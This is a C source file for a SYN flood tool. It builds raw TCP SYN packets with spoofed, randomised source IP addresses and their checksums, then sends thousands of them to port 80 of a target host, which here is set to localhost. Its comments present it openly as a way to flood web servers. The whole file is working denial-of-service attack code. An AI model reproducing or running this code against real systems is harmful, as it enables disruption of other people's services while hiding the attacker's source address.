#define _GNU_SOURCE

#include <stdio.h>
#include <string.h> 		// memset(...)
#include <arpa/inet.h>
#include <unistd.h>			// geteuid(void)
#include <sys/types.h>
#include <stdlib.h> 		// exit(0), abort(void);
#include <errno.h> 			// perror
#include <netinet/tcp.h>	// header structs
#include <netinet/ip.h>		// header structs
#include <unistd.h>
     
#define PORT 80				// good-bye apache, nginx, ..
#define IP_SIZE 16			// 16 bytes for an ip sizeof "255.255.255.255" can be done as well
#define PACKET_MAX_SIZE 65535	// per definition IP Packet may have a size of 2^16-1 bytes



/** The pseudo_header is needed to create a checksum 
	See: http://de.wikipedia.org/wiki/Transmission_Control_Protocol#TCP-Pr.C3.BCfsumme_und_TCP-Pseudo-Header
**/
struct pseudo_header    
{
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;

	struct tcphdr tcp;
};


/** Create the checksums IPh, TCPh 
	How: Add multiple shorts (binary addition), leftmost carrier as feedback 
*/
unsigned short csum(unsigned short *ptr,int nbytes) 						// Invalid Checksums maybe through Checksum offloading
{
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) 
	{
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) 
	{
		oddbyte=0;
		*((u_char*)&oddbyte)=*(u_char*)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;

	return(answer);
}



int testRoot()
{
	printf("Are you root.. ");
	fflush(stdout);
	if (geteuid() != 0)		// Got root?
	{
		perror("not really!");
		exit(-1);
	}
	printf("yes!\n");
}

int main (void)
{
  int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);												// create raw socket
  char packet[PACKET_MAX_SIZE], source_ip[IP_SIZE], destination_ip[IP_SIZE], randIP[IP_SIZE];		// packet will contain IPh, TCPh, flags and data
  struct ip *iph = (struct ip *) packet;														// beware BSD, Linux (struct iphdr, struct ip etc.)
  struct tcphdr *tcph = (struct tcphdr *) (packet + sizeof (struct ip));						// same stuff ..
  struct sockaddr_in sin; 																		// sockaddr_in contains the destination
  struct pseudo_header psh;																		// filled later to create a decent packet (CheckSum)

	
	if(!testRoot())
		exit(EXIT_FAILURE);

  strcpy(source_ip , "123.123.113.123");														// spoof source address
  strcpy(destination_ip, "127.0.0.1");															// host to flood
  sin.sin_family = AF_INET;																		// Use usual internet addresses
  sin.sin_port = htons (PORT);																	// which port to flood in network byte-order
  sin.sin_addr.s_addr = inet_addr ("127.0.0.1");												// .. home address
  memset (packet, 0, PACKET_MAX_SIZE);							

  iph->ip_hl = 5;
  iph->ip_v = 4;
  iph->ip_tos = 0;
  iph->ip_len = sizeof (struct ip) + sizeof (struct tcphdr);
  iph->ip_id = htonl (54321);							// Init has a random ID
  iph->ip_off = 0;
  iph->ip_ttl = 255;
  iph->ip_p = 6;
  iph->ip_sum = 0;		
  iph->ip_src.s_addr = inet_addr (source_ip);
  iph->ip_dst.s_addr = inet_addr (destination_ip);

	tcph->source = htons (3664);										// Always the same source port
	tcph->dest = htons (80);											// Destination port to flood
	tcph->seq = random();												// Random sequence for handshake
	tcph->ack_seq = 0;													// Should be 0 
	tcph->doff = 5;											
	tcph->fin=0;
	tcph->syn=1;														// Set syn flag
	tcph->rst=0;
	tcph->psh=0;
	tcph->ack=0;
	tcph->urg=0;
	tcph->window = htons (65535);										
	tcph->check = 0;													
	tcph->urg_ptr = 0;

  iph->ip_sum = csum ((unsigned short *) packet, iph->ip_len >> 1); // In order to let the packet be routed we need a proper checksum
	
	psh.source_address = inet_addr( source_ip );
	psh.dest_address =  inet_addr(destination_ip);
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(sizeof(struct tcphdr));									// TCPh has 20 bytes

	
	//printf("%d %d %d\n",sizeof(struct pseudo_header), sizeof(struct tcphdr), sizeof(struct ip));
	
	memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
	tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));	


    int tmp = 1;
    const int *val = &tmp;
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0)	// Set option for IP protocol, we provide the header
    {
		perror("HDRINCL not set.\n");
		exit(EXIT_FAILURE);			
	}

	int i = 0;
	int n = 0;
	for(; i < 10000; i++)
    {
		snprintf(randIP,IP_SIZE,"%lu.%lu.%lu.%lu",random() % 254 +1,random() % 254 +1,random() % 254 +1,random() % 254  +1);
        iph->ip_src.s_addr = inet_addr(randIP);       
        iph->ip_sum = csum ((unsigned short *) packet, iph->ip_len >> 1);
		psh.source_address = inet_addr( randIP );
		tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));	

		if (sendto (s, packet, iph->ip_len, 0, (struct sockaddr *) &sin, sizeof (sin)) < 0)		
		{
			printf("Packet from: %s to: %s not sent.\n",randIP,destination_ip);
			exit(EXIT_FAILURE);
		}
	    else
		{
			n++;
			printf("Packet from: %s to: %s sent.\n",randIP,destination_ip);
			if (n % 100 == 0)
				printf ("Packets sent: %d\n",n);
		}

		sleep(1); // You might wanna slow things down
    }


  return 0;
}

